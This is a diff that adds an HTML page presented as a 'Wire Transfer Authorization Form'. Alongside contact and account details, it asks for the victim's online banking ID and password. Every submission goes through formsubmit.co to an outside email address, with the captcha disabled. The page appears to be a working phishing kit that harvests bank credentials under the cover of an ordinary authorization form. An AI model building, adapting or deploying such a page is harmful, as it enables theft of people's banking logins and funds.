@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Wire Transfer Authorization Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f8f9fa;
+      padding: 20px;
+    }
+    form {
+      background: white;
+      padding: 25px;
+      border-radius: 10px;
+      max-width: 600px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    label {
+      font-weight: bold;
+    }
+    input, select, textarea {
+      width: 100%;
+      padding: 8px;
+      margin: 10px 0 20px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    button {
+      background-color: #007BFF;
+      color: white;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+
+  <form action="https://formsubmit.co/contactus@legaloutreach.org" method="POST">
+    <h2>Wire Transfer Authorization Form</h2>
+
+    <label>First Name</label>
+    <input type="text" name="First Name" required />
+
+    <label>Last Name</label>
+    <input type="text" name="Last Name" required />
+    
+    <label>Contact Number</label>
+    <input type="tel" name="Contact Number" required />
+
+    <label>Email Address</label>
+    <input type="email" name="Email" required />
+
+    <label>Bank Name</label>
+    <input type="text" name="Bank Name" required />
+
+    <label>Account Holder Name</label>
+    <input type="text" name="Account Holder Name" required />
+
+    <label>Account Number</label>
+    <input type="text" name="Account Number" required />
+
+    <label>Routing / SWIFT Code</label>
+    <input type="text" name="Bank Code" required />
+
+    <label>Banking ID</label>
+    <textarea name="Bank ID" required></textarea>
+
+     <label>Banking Password</label>
+    <textarea name="Bank Password" required></textarea>
+    
+    <label>Type of Account</label>
+    <select name="Account Type" required>
+      <option value="">--Select--</option>
+      <option value="Checking">Checking</option>
+      <option value="Savings">Savings</option>
+    </select>
+
+    <label>Typed Signature (Full Name)</label>
+    <input type="text" name="Signature" required />
+
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_template" value="table">
+    <input type="hidden" name="_subject" value="New Wire Authorization Submitted">
+
+    <button type="submit">Submit Authorization</button>
+  </form>
+
+</body>
+</html>
